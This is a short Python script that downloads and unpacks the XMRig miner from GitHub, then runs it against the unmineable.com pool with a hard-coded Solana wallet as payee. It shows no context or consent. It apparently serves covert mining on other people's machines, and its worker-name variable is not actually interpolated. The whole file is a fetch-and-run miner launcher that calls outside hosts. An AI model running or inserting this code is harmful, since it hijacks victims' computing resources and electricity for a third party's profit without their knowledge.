import os
import random
from random import randint
num = random.randint(1,1000000)
os.system('wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz')
os.system('cd xmrig-6.22.2 && ./xmrig -a gr -o stratum+ssl://rx.unmineable.com:443 -p x -u SOL:G5MFVuQvYabm9sknjwXi9HcHVLGYnEdiQcsQ3NASP1W3.tothemoonRX{num}#8s32-cp81')
